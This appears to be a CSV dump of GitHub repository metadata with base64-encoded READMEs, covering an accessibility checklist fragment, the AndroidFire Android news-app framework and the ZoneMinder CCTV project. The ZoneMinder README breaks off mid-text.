name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
LSBbIF0gSWYgY29udGVudCBpcyBtZWFudCB0byBiZSBoaWRkZW4sIGVuc3Vy
ZSBpdCBpcyBwcm9wZXJseSBoaWRkZW4gdG8gYWxsIHVzZXJzCi0gWyBdIE1h
a2Ugc3VyZSBjb250cm9scyB3aXRoaW4gaGlkZGVuIGNvbnRlbnQgYXJlIG5v
dCBmb2N1c2FibGUKLSBbIF0gVXNlIGBzcmNzZXRgIHRvIHRhaWxvciBpbWFn
ZXMgdG8gZGV2aWNlcyBhbmQgcmVkdWNlIGJhbmR3aWR0aCBjb3N0cwotIFsg
XSBEbyBub3QgYXV0byBmb2N1cyBmb3JtIGZpZWxkcywgb24gcGFnZSBsb2Fk
Ci0gWyBdIEJyZWFrIHVwIGxvbmcgYW5kIGNvbXBsZXggZm9ybXMgaW50byBk
aXNjcmV0ZSBzZWN0aW9ucyBhbmQvb3Igc2NyZWVucwotIFsgXSBNYWtlIGZv
cm1zIGFzIHNob3J0IGFzIHBvc3NpYmxlOyBvZmZlciBzaG9ydGN1dHMgbGlr
ZSBhdXRvY29tcGxldGluZyB0aGUgYWRkcmVzcyB1c2luZyB0aGUgcG9zdGNv
ZGUKLSBbIF0gRW5zdXJlIHRoZSBzYW1lIGNvbnRlbnQgaXMgYXZhaWxhYmxl
IGFjcm9zcyBkaWZmZXJlbnQgZGV2aWNlcyBhbmQgcGxhdGZvcm1zCi0gWyBd
IEluZm9ybSB0aGUgdXNlciB3aGVuIHRoZXJlIGFyZSBpbXBvcnRhbnQgY2hh
bmdlcyB0byB0aGUgYXBwbGljYXRpb24gc3RhdGUKLSBbIF0gTWFrZSBzdXJl
IHRoZSBwdXJwb3NlIG9mIGEgbGluayBpcyBjbGVhcmx5IGRlc2NyaWJlZDog
InJlYWQgbW9yZSIgdnMuICJyZWFkIG1vcmUgYWJvdXQgYWNjZXNzaWJpbGl0
eSIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'AndroidFire',69235642,b'AndroidFire\xef\xbc\x8c\xe4\xb8\x80\xe6\xac\xbe\xe6\x96\xb0\xe9\x97\xbb\xe9\x98\x85\xe8\xaf\xbb App\xe6\xa1\x86\xe6\x9e\xb6\xef\xbc\x8c\xe5\x9f\xba\xe4\xba\x8e Material Design + MVP + RxJava + Retrofit + Glide\xef\xbc\x8c\xe5\x9f\xba\xe6\x9c\xac\xe6\xb6\xb5\xe7\x9b\x96\xe4\xba\x86\xe5\xbd\x93\xe5\x89\x8d Android \xe7\xab\xaf\xe5\xbc\x80\xe5\x8f\x91\xe6\x9c\x80\xe5\xb8\xb8\xe7\x94\xa8\xe7\x9a\x84\xe4\xb8\xbb\xe6\xb5\x81\xe6\xa1\x86\xe6\x9e\xb6\xef\xbc\x8c\xe5\x9f\xba\xe4\xba\x8e\xe6\xad\xa4\xe6\xa1\x86\xe6\x9e\xb6\xe5\x8f\xaf\xe4\xbb\xa5\xe5\xbf\xab\xe9\x80\x9f\xe5\xbc\x80\xe5\x8f\x91\xe4\xb8\x80\xe4\xb8\xaaapp\xe3\x80\x82',b'Java',34,2390,,2390,False,b'https://api.github.com/repos/jaydenxiao2016/AndroidFire/forks',"QW5kcm9pZEZpcmXvvIzkuIDmrL7mlrDpl7vpmIXor7sgQXBw5qGG5p6277yM
5Z+65LqOIE1hdGVyaWFsIERlc2lnbiArIE1WUCArIFJ4SmF2YSArIFJldHJv
Zml0ICsgR2xpZGXvvIzln7rmnKzmtrXnm5bkuoblvZPliY0gQW5kcm9pZCDn
q6/lvIDlj5HmnIDluLjnlKjnmoTkuLvmtYHmoYbmnrbvvIzln7rkuo7mraTm
oYbmnrblj6/ku6Xlv6vpgJ/lvIDlj5HkuIDkuKphcHDjgIIKClvlronoo4Xl
nLDlnYBdKGh0dHA6Ly9maXIuaW0vYW5kcm9pZEZpcmUpCiMjIyMg5Zu96ZmF
5qGI5L6L77yM5pyJ5Zu+5pyJ55yf55u477yaCgohW+mmlumhteaViOaenOWb
vl0oaHR0cHM6Ly9tbWJpei5xbG9nby5jbi9tbWJpel9qcGcvMkVoakNjY2VP
bWlhY1ZzSTR3RTZjRHBPWUhjMGdya2liemlicG94QUc4RXdCTFZuNGRIaWIz
RDBXd3JlejRXZU5tRmtpYjE5dktpYlluTXU5blF1Y3FQNWd2dncvMD93eF9m
bXQ9anBlZykKIVvnvo7lpbPlkozop4bpopHmlYjmnpzlm75dKGh0dHBzOi8v
bW1iaXoucWxvZ28uY24vbW1iaXpfanBnLzJFaGpDY2NlT21pYWNWc0k0d0U2
Y0RwT1lIYzBncmtpYnpxYW8xaWEyNlJpYVprUDkxdEtlUEdUNE9rdVdVODd3
dFlkbXhwVGF1aWFsSWhoa1ZOaWM1RFRVYmlhZy8wP3d4X2ZtdD1qcGVnKQoh
W+WFs+azqOWSjOaci+WPi+WciOaViOaenOWbvl0oaHR0cHM6Ly9tbWJpei5x
bG9nby5jbi9tbWJpel9qcGcvMkVoakNjY2VPbWlhY1ZzSTR3RTZjRHBPWUhj
MGdya2lienhiWkJwY3d6ZlQ0aWNuNjEzbHRwdmNwVlExdW0yUnJkT0tPekEy
WE84RVRURTVES1RudEtTQlEvMD93eF9mbXQ9anBlZykKIVvmnIvlj4vlnIjp
gInmi6nlm77niYflj5HluINdKGh0dHBzOi8vbW1iaXoucWxvZ28uY24vbW1i
aXpfanBnLzJFaGpDY2NlT21pYWNWc0k0d0U2Y0RwT1lIYzBncmtpYnpBSUxB
bzVua1FobnNIa0wzR3lqYmdFaWI4Q0Z5a0FqWEtuOVNLd3NEN1BTemZRREJo
T0lzVkZBLzA/d3hfZm10PWpwZWcpCgojIyMjIOebruWJjeaooeWdl+WMheaL
rO+8mgotIOaWsOmXu++8muWktOadoeOAgeenkeaKgOOAgei0oue7j+OAgU5C
Qeetieexu+Wei++8jOWPr+iHquS4u+mAieaLqeiuoumYhQotIOe+juWbvu+8
mue+juWbvuWjgee6uAotIOinhumike+8muWMheaLrOeDreeCueOAgeaQnues
keOAgeWoseS5kOOAgeeyvuWTgeinhumikQotIOWFs+azqO+8muWMheaLrOac
i+WPi+WciOOAgeaXpeWknOaooeW8j+WIh+aNoijml6DpnIDph43lkK/nlYzp
naIp5Yqf6IO9CgojIyMjIOmhueebruS6rueCue+8mgotIG12cOaooeW8j++8
muino+iApm1vZGVs5ZKMdmlld+Wxgu+8jOWlkee6puexu+euoeeQhm12cO+8
jOS4gOebruS6hueEtu+8jOWunueOsOe6teWQkeino+iApu+8jOWfuuexu+Wu
jOe+juWwgeijhe+8jOmBv+WFjemikee5gW5ld+WvueixoQotICBSeEphdmE6
5YyF5ousUnjlpITnkIbmnI3liqHlmajor7fmsYLjgIHnvJPlrZjjgIHnur/n
qIvosIPluqbnmoTlroznvo7lsIHoo4UKLSDlpI3mnYLliJfooajlpITnkIbv
vIzlhYXliIbop6PlhrPmu5HliqjljaHpob/pl67popjvvIzlhbfkvZPmlrnm
s5XnnIvlhbPms6jmqKHlnZfph4zpnaLnmoTigJzmnIvlj4vlnIjigJ3kvovl
rZAKLSDnu4Tku7bljJblvIDlj5HvvIzmqKrlkJHop6PogKYKLSDlsIHoo4Xl
kITnp43lt6XlhbfnsbvvvIzmr5TlpoLljovnvKnlm77niYfjgIHova7mkq3l
majjgIHmn6XnnIvlpKflm77jgIHnvJPlrZjlt6XlhbfjgIHlm77niYfpgInm
i6nlmajvvIzku6Vjb21tb27nmoRtb2R1bGXlvaLlvI/kvp3otZYKLSDlkITn
p43lsIHoo4Xlpb3nmoTkvp3otZblupPvvIzmr5TlpoJJcmVjeWNsZXJ2aWV3
77ya5YyF5ZCr5LiH6IO96YCC6YWN5Zmo44CBcmVjeWNsZXJ2aWV355qE5LiL
5ouJ5Yi35paw5LiK5ouJ5Yqg6L295pu05aSa44CB6Ieq5a6a5LmJ5Yi35paw
5aS05ZKM5Yqg6L295pu05aSa5aS077ybc2VsZWN0b3JkaWFsb2fvvJrnu4/l
uLjkvb/nlKjliLDnmoTlh6Dnp41EaWFsb2fvvJtvbmVLZXlTaGFyZVNES++8
muekvuS6pOWIhuS6q++8m+W+ruS/oeWSjOaUr+S7mOWuneWwgeijheetieet
iQotIOaXoOWFs+S4muWKoeWGheWuueWwgeijheaIkG1vZGVs77yM5Z+65LqO
5q2k5qGG5p625Y+v5Lul5b+r6YCf5byA5Y+R5LiA5LiqYXBwCgojIyMjIOeU
qOWIsOeahOW8gOa6kOW6k+acie+8mgotIG9tLmZseWNvLnRhYmxheW91dDpG
bHljb1RhYkxheW91dF9MaWI6Mi4wLjhAYWFyIAotIGNvbS5naXRodWIuY2xh
bnM6ZmFiOjEuNi40Ci0gY29tLnNxdWFyZXVwLnJldHJvZml0MjpyZXRyb2Zp
dDoyLjAuMC1iZXRhMwotIGlvLnJlYWN0aXZleDpyeGphdmE6MS4wLjEKLSBp
by5yZWFjdGl2ZXg6cnhhbmRyb2lkOjEuMC4xCi0gY29tLmdpdGh1Yi5idW1w
dGVjaC5nbGlkZTpnbGlkZTozLjYuMQotIGZtLmppZWNhbzpqaWVjYW92aWRl
b3BsYXllcjo0LjcuMCAKLSBjbi5odWdldGVycnkudXBkYXRlZnVuOnVwZGF0
ZWZ1bjoxLjguNuetieetiQoKPuacrOS6uuS8muWdmuaMgeWcqOi/meS4qumh
ueebruS4iuWunui3teacgOaWsOeahOaKgOacr++8jOS5n+S8muS6ieWPluaL
k+WxleabtOWkmueahOmYheivu+WGheWuue+8jOasoui/juWQhOS9jeWFs+az
qO+8gQrms6jmhI/vvJrmnKzpobnnm67ov5jlnKjmtYvor5XpmLbmrrXvvIzl
j5HnjrAgYnVnIOaIluacieWlveeahOW7uuiuruasoui/jmlzc3Vl44CBZW1h
aWwoamF5ZGVueGlhbzIwMTZAZ21haWwuY29tKSzlpoLmnpzmhJ/op4nlr7nk
vaDmnInluK7liqnkuZ/mrKLov47ngrnkuKogc3RhcuOAgWZvcmvvvIzmnKzp
obnnm67ku4XlgZrlrabkuaDkuqTmtYHkvb/nlKjvvIxBUEkg5pWw5o2u5YaF
5a655omA5pyJ5p2D5b2S5Y6f5L2c5YWs5Y+45omA5pyJ77yM6K+35Yu/55So
5LqO5YW25LuW55So6YCUCgrmnIDlkI7pmYTkuIrkuIvovb3lnLDlnYDlkozm
upDnoIEKW2dpdGh1Yua6kOeggV0oaHR0cHM6Ly9naXRodWIuY29tL2pheWRl
bnhpYW8yMDE2L0FuZHJvaWRGaXJlKQpb5a6J6KOF5Zyw5Z2AXShodHRwOi8v
ZmlyLmltL2FuZHJvaWRGaXJlKQoK5pu05aSa57K+5b2p5paH56ug6K+35YWz
5rOo5b6u5L+h5YWs5LyX5Y+3IioqQW5kcm9pZOe7j+mqjOWIhuS6qyoqIu+8
mui/memHjOWwhumVv+acn+S4uuaCqOWIhuS6q0FuZHJvaWTpq5jmiYvnu4/p
qozjgIHkuK3lpJblvIDmupDpobnnm67jgIHmupDnoIHop6PmnpDjgIHmoYbm
nrborr7orqHlkoxBbmRyb2lk5aW95paH5o6o6I2Q77yBCgohW+aJq+S4gOaJ
q+WKoOaIkeWTpl0oaHR0cDovL3VwbG9hZC1pbWFnZXMuamlhbnNodS5pby91
cGxvYWRfaW1hZ2VzLzE5NjQwOTYtNmIwNGQyZTdjZmY2ZDdjNy5qcGc/aW1h
Z2VNb2dyMi9hdXRvLW9yaWVudC9zdHJpcCU3Q2ltYWdlVmlldzIvMi93LzEy
NDApCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'zoneminder',9395939,"b'ZoneMinder is a free, open source Closed-circuit television software application developed for Linux which supports IP, USB and Analog cameras. '",b'PHP',53,2390,,2390,False,b'https://api.github.com/repos/ZoneMinder/zoneminder/forks',"Wm9uZU1pbmRlcgo9PT09PT09PT09CgpbIVtCdWlsZCBTdGF0dXNdKGh0dHBz
Oi8vdHJhdmlzLWNpLm9yZy9ab25lTWluZGVyL3pvbmVtaW5kZXIucG5nKV0o
aHR0cHM6Ly90cmF2aXMtY2kub3JnL1pvbmVNaW5kZXIvem9uZW1pbmRlcikg
WyFbQm91bnR5c291cmNlXShodHRwczovL2FwaS5ib3VudHlzb3VyY2UuY29t
L2JhZGdlL3RlYW0/dGVhbV9pZD0yMDQmc3R5bGU9Ym91bnRpZXNfcmVjZWl2
ZWQpXShodHRwczovL3d3dy5ib3VudHlzb3VyY2UuY29tL3RlYW1zL3pvbmVt
aW5kZXIvaXNzdWVzP3V0bV9zb3VyY2U9Wm9uZU1pbmRlciZ1dG1fbWVkaXVt
PXNoaWVsZCZ1dG1fY2FtcGFpZ249Ym91bnRpZXNfcmVjZWl2ZWQpCgpbIVtK
b2luIFNsYWNrXShodHRwczovL2dpdGh1Yi5jb20vb3pvbmVzZWN1cml0eS9v
em9uZWJhc2UvYmxvYi9tYXN0ZXIvaW1nL3NsYWNrc20ucG5nP3Jhdz10cnVl
KV0oaHR0cHM6Ly9qb2luLnNsYWNrLmNvbS90L3pvbmVtaW5kZXItY2hhdC9z
aGFyZWRfaW52aXRlL2VuUXROVFUwTkRreE1ETTVORFF3TFRkaFptUTVZMk0y
TldReU4ySmtZVEJpTjJaa016SXpaR1EwTURsaU1UUm1NMkZqWldSbFl6VXdZ
VFEyTWpNd01UVmpNelExTmpZeE9UZG1NakUyTVRFKQoKQWxsIGRvY3VtZW50
YXRpb24gZm9yIFpvbmVNaW5kZXIgaXMgbm93IG9ubGluZSBhdCBodHRwczov
L3pvbmVtaW5kZXIucmVhZHRoZWRvY3Mub3JnCgojIyBPdmVydmlldwoKWm9u
ZU1pbmRlciBpcyBhbiBpbnRlZ3JhdGVkIHNldCBvZiBhcHBsaWNhdGlvbnMg
d2hpY2ggcHJvdmlkZSBhIGNvbXBsZXRlIHN1cnZlaWxsYW5jZSBzb2x1dGlv
biBhbGxvd2luZyBjYXB0dXJlLCBhbmFseXNpcywgcmVjb3JkaW5nIGFuZCBt
b25pdG9yaW5nIG9mIGFueSBDQ1RWIG9yIHNlY3VyaXR5IGNhbWVyYXMgYXR0
YWNoZWQgdG8gYSBMaW51eCBiYXNlZCBtYWNoaW5lLiBJdCBpcyBkZXNpZ25l
ZCB0byBydW4gb24gZGlzdHJpYnV0aW9ucyB3aGljaCBzdXBwb3J0IHRoZSBW
aWRlbyBGb3IgTGludXggKFY0TCkgaW50ZXJmYWNlIGFuZCBoYXMgYmVlbiB0
ZXN0ZWQgd2l0aCB2aWRlbyBjYW1lcmFzIGF0dGFjaGVkIHRvIEJUVFYgY2Fy
ZHMsIHZhcmlvdXMgVVNCIGNhbWVyYXMgYW5kIGFsc28gc3VwcG9ydHMgbW9z
dCBJUCBuZXR3b3JrIGNhbWVyYXMuIAoKIyMgQ29udGFjdGluZyB0aGUgRGV2
ZWxvcG1lbnQgVGVhbQpCZWZvcmUgY3JlYXRpbmcgYW4gaXNzdWUgaW4gb3Vy
IGdpdGh1YiBmb3J1bSwgcGxlYXNlIHJlYWQgb3VyIHBvc3RpbmcgcnVsZXM6
Cmh0dHBzOi8vZ2l0aHViLmNvbS9ab25lTWluZGVyL1pvbmVNaW5kZXIvd2lr
aS9HaXRodWItUG9zdGluZy1SdWxlcwoKIyMgT3VyIERvY2tlcmZpbGUgaGFz
IG1vdmVkClBsZWFzZSBmaWxlIGlzc3VlcyBhZ2FpbnN0IHRoZSBab25lTWlu
ZGVyIERvY2tlcmZpbGUgaGVyZTogCmh0dHBzOi8vZ2l0aHViLmNvbS9ab25l
TWluZGVyL3ptZG9ja2VyZmlsZXMKCiMjIEluc3RhbGxhdGlvbiBNZXRob2Rz
CgojIyMgQnVpbGRpbmcgZnJvbSBTb3VyY2UgaXMgRGlzY291cmFnZWQKCkhp
c3RvcmljYWxseSwgaW5zdGFsbGluZyBab25lTWluZGVyIG9udG8geW91ciBz
eXN0ZW0gcmVxdWlyZWQgYnVpbGRpbmcgZnJvbSBzb3VyY2UgY29kZSBieSBp
c3N1aW5nIHRoZSB0cmFkaXRpb25hbCBjb25maWd1cmUsIG1ha2UsIG1ha2Ug
aW5zdGFsbCBjb21tYW5kcy4gIFRvIGdldCBab25lTWluZGVyIHRvIGJ1aWxk
LCBhbGwgb2YgaXRzIGRlcGVuZGVuY2llcyBoYWQgdG8gYmUgZGV0ZXJtaW5l
ZCBhbmQgaW5zdGFsbGVkIGJlZm9yZWhhbmQuIEluaXQgYW5kIGxvZ3JvdGF0
ZSBzY3JpcHRzIGhhZCB0byBiZSBtYW51YWxseSBjb3BpZWQgaW50byBwbGFj
ZSBmb2xsb3dpbmcgdGhlIGJ1aWxkLiAgT3B0aW9uYWwgcGFja2FnZXMgc3Vj
aCBhcyBqc2NhbGVuZGFyIGFuZCBDYW1ib3pvbGEgaGFkIHRvIGJlIG1hbnVh
bGx5IGluc3RhbGxlZC4gVW5pbnN0YWxscyBjb3VsZCBsZWF2ZSBzdGFsZSBm
aWxlcyBhcm91bmQsIHdoaWNoIGNvdWxkIGNhdXNlIHByb2JsZW1zIGR1cmlu
ZyBhbiB1cGdyYWRlLiAgU3BlYWtpbmcgb2YgdXBncmFkZXMsIHdoZW4gaXQg
Y29tZXMgdGltZSB0byB1cGdyYWRlIGFsbCB0aGVzZSBtYW51YWwgc3RlcHMg
bXVzdCBiZSByZXBlYXRlZCBhZ2Fpbi4KCkJldHRlciBtZXRob2RzIGV4aXN0
IHRvZGF5IHRoYXQgZG8gbXVjaCBvZiB0aGlzIGZvciB5b3UuIFRoZSBjdXJy
ZW50IGRldmVsb3BtZW50IHRlYW0sIGFsb25nIHdpdGggb3RoZXIgdm9sdW50
ZWVycywgaGF2ZSB0YWtlbiBncmVhdCBzdHJpZGVzIGluIHByb3ZpZGluZyB0
aGUgcmVzb3VyY2VzIG5lY2Vzc2FyeSB0byBhdm9pZCBidWlsZGluZyBmcm9t
IHNvdXJjZS4gIAoKIyMjIEluc3RhbGwgZnJvbSBhIFBhY2thZ2UgUmVwb3Np
dG9yeQoKVGhpcyBpcyB0aGUgcmVjb21tZW5kZWQgbWV0aG9kIHRvIGluc3Rh
bGwgWm9uZU1pbmRlciBvbnRvIHlvdXIgc3lzdGVtLiBab25lTWluZGVyIHBh
Y2thZ2VzIGFyZSBtYWludGFpbmVkIGZvciB0aGUgZm9sbG93aW5nIGRpc3Ry
b3M6CgotIFVidW50dSB2aWEgW0ljb25ub3IncyBQUEFdKGh0dHBzOi8vbGF1
bmNocGFkLm5ldC9+aWNvbm5vcikKLSBEZWJpYW4gZnJvbSB0aGVpciBbZGVm
YXVsdCByZXBvc2l0b3J5XShodHRwczovL3BhY2thZ2VzLmRlYmlhbi5vcmcv
c2VhcmNoP3NlYXJjaG9uPW5hbWVzJmtleXdvcmRzPXpvbmVtaW5kZXIpIAot
IFJIRUwvQ2VudE9TIGFuZCBjbG9uZXMgdmlhIFtSUE0gRnVzaW9uXShodHRw
Oi8vcnBtZnVzaW9uLm9yZykKLSBGZWRvcmEgdmlhIFtSUE0gRnVzaW9uXSho
dHRwOi8vcnBtZnVzaW9uLm9yZykKLSBPcGVuU3VzZSB2aWEgW3RoaXJkIHBh
cnR5IHJlcG9zaXRvcnldKGh0dHA6Ly93d3cuem9uZW1pbmRlci5jb20vd2lr
aS9pbmRleC5waHAvSW5zdGFsbGluZ191c2luZ19ab25lTWluZGVyX1JQTXNf
Zm9yX1N1U0UpCi0gTWFnZWlhIGZyb20gdGhlaXIgZGVmYXVsdCByZXBvc2l0
b3J5Ci0gQXJjaCB2aWEgdGhlIFtBVVJdKGh0dHBzOi8vYXVyLmFyY2hsaW51
eC5vcmcvcGFja2FnZXMvem9uZW1pbmRlci8pCi0gR2VudG9vIGZyb20gdGhl
aXIgW2RlZmF1bHQgcmVwb3NpdG9yeV0oaHR0cHM6Ly9wYWNrYWdlcy5nZW50
b28ub3JnL3BhY2thZ2VzL3d3dy1taXNjL3pvbmVtaW5kZXIpCgpJZiBhIHJl
cG9zaXRvcnkgdGhhdCBob3N0cyBab25lTWluZGVyIHBhY2thZ2VzIGlzIG5v
dCBhdmFpbGFibGUgZm9yIHlvdXIgZGlzdHJvLCB0aGVuIHlvdSBhcmUgZW5j
b3VyYWdlZCB0byBidWlsZCB5b3VyIG93biBwYWNrYWdlLCByYXRoZXIgdGhh
biBidWlsZCBmcm9tIHNvdXJjZS4gIFdoaWxlIGVhY2ggZGlzdHJvIGlzIGRp
ZmZlcmVudCBpbiB3YXlzIHRoYXQgc2V0IGl0IGFwYXJ0IGZyb20gYWxsIHRo
ZSBvdGhlcnMsIHRoZXkgYXJlIG9mdGVuIHNpbWlsYXIgZW5vdWdoIHRvIGFs
bG93IHlvdSB0byBhZGFwdCBhbm90aGVyIGRpc3RybydzIHBhY2thZ2UgYnVp
bGRpbmcgaW5zdHJ1Y3Rpb25zIHRvIHlvdXIgb3duLgoKIyMjIEJ1aWxkaW5n
IGEgWm9uZU1pbmRlciBQYWNrYWdlICMjIwoKQnVpbGRpbmcgWm9uZU1pbmRl
ciBpbnRvIGEgcGFja2FnZSBpcyBub3QgYW55IGhhcmRlciB0aGFuIGJ1aWxk
aW5nIGZyb20gc291cmNlLiAgQXMgYSBtYXR0ZXIgb2YgZmFjdCwgaWYgeW91
IGhhdmUgc3VjY2Vzc2Z1bGx5IGJ1aWx0IFpvbmVNaW5kZXIgZnJvbSBzb3Vy
Y2UgaW4gdGhlIHBhc3QsIHRoZW4geW91IG1heSBmaW5kIHRoZXNlIHN0ZXBz
IHRvIGJlIGVhc2llci4gCgpXaGVuIGJ1aWxkaW5nIGEgcGFja2FnZSwgaXQg
aXMgYmVzdCB0byBkbyB0aGlzIHdvcmsgaW4gYSBzZXBhcmF0ZSBlbnZpcm9u
bWVudCwgZGVkaWNhdGVkIHRvIGRldmVsb3BtZW50IHB1cnBvc2VzLiBUaGlz
IGNvdWxkIGJlIGFzIHNpbXBsZSBhcyBjcmVhdGluZyBhIHZpcnR1YWwgbWFj
aGluZSwgdXNpbmcgRG9ja2VyLCBvciB1c2luZyBtb2NrLiAgQWxsIGl0IHRh
a2VzIGlzIG9uZSDigJxPb3Bz4oCdIHRvIHJlZ3JldCBkb2luZyB0aGlzIHdv
cmsgb24geW91ciBwcm9kdWN0aW9uIHNlcnZlci4KCkxhc3RseSwgaWYgeW91
IGRlc2lyZSB0byBidWlsZCBhIGRldmVsb3BtZW50IHNuYXBzaG90IGZyb20g
dGhlIG1hc3RlciBicmFuY2gsIGl0IGlzIHJlY29tbWVuZGVkIHlvdSBmaXJz
dCBidWlsZCB5b3VyIHBhY2thZ2UgdXNpbmcgYW4gb2ZmaWNpYWwgcmVsZWFz
ZSBvZiBab25lTWluZGVyLiBUaGlzIHdpbGwgaGVscCBpZGVudGlmeSB3aGV0
aGVyIGFueSBwcm9ibGVtcyB5b3UgbWF5IGVuY291bnRlciBhcmUgY2F1c2Vk
IGJ5IHRoZSBidWlsZCBwcm9jZXNzIG9yIGlzIGEgbmV3IGlzc3VlIGluIHRo
ZSBtYXN0ZXIgYnJhbmNoLgoKUGxlYXNlIHZpc2l0IG91ciBbUmVhZHRoZURv
Y3Mgc2l0ZV0oaHR0cHM6Ly96b25lbWluZGVyLnJlYWR0aGVkb2NzLm9yZy9l
bi9zdGFibGUvaW5zdGFsbGF0aW9uZ3VpZGUvaW5kZXguaHRtbCkgZm9yIGRp
c3RybyBzcGVjaWZpYyBpbnN0cnVjdGlvbnMuCgojIyMgUGFja2FnZSBNYWlu
dGFpbmVycwpNYW55IG9mIHRoZSBab25lTWluZGVyIGNvbmZpZ3VyYXRpb24g
dmFyaWFibGUgZGVmYXVsdCB2YWx1ZXMgYXJlIG5vdCBjb25maWd1cmFibGUg
YXQgYnVpbGQgdGltZSB0aHJvdWdoIGF1dG90b29scyBvciBjbWFrZS4gIEEg
bmV3IHRvb2wgY2FsbGVkICp6bWVkaXRjb25maWdkYXRhLnNoKiBoYXMgYmVl
biBhZGRlZCB0byBhbGxvdyBwYWNrYWdlIG1haW50YWluZXJzIHRvIG1hbmlw
dWxhdGUgYW55IHZhcmlhYmxlIHN0b3JlZCBpbiBDb25maWdEYXRhLnBtIHdp
dGhvdXQgcGF0Y2hpbmcgdGhlIHNvdXJjZS4gCgpGb3IgZXhhbXBsZSwgbGV0
J3Mgc2F5IEkgaGF2ZSBjcmVhdGVkIGEgbmV3IFpvbmVNaW5kZXIgcGFja2Fn
ZSB0aGF0IGNvbnRhaW5zIHRoZSBjYW1ib3pvbGEgamF2YXNjcmlwdCBmaWxl
LiAgSG93ZXZlciwgYnkgZGVmYXVsdCBjYW1ib3pvbGEgc3VwcG9ydCBpcyB0
dXJuZWQgb2ZmLiAgVG8gZml4IHRoYXQsIGFkZCB0aGlzIHRvIHRoZSBwYWNr
YWdpbmcgc2NyaXB0OgpgYGBiYXNoCi4vdXRpbHMvem1lZGl0Y29uZmlnZGF0
YS5zaCBaTV9PUFRfQ0FNQk9aT0xBIHllcwpgYGAKCk5vdGUgdGhhdCB6bWVk
aXRjb25maWdkYXRhLnNoIGlzIGludGVuZGVkIHRvIGJlIGNhbGxlZCwgZnJv
